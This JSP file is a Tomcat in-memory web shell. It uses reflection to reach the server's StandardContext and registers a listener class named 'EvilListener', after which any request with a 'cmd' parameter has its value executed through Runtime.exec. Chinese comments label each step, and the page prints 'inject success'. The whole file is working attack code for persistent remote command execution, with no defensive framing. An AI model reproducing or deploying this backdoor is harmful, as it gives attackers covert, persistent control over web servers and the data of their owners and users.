<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>

<%
    class EvilListener implements ServletRequestListener{
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

        }

        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            if(request.getParameter("cmd") != null){
                try {
                    System.out.println(request.getParameter("cmd"));
                    Runtime.getRuntime().exec(request.getParameter("cmd").toString());

                } catch (IOException e) {}
            }
        }
    }
%>

<%
    //获取上下文context
    ServletContext servletContext =  request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);

    //获取StandardContext
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    out.println("inject success");

    //通过addApplicationEventListener，添加自定义的恶意listener
    standardContext.addApplicationEventListener(new EvilListener());

%>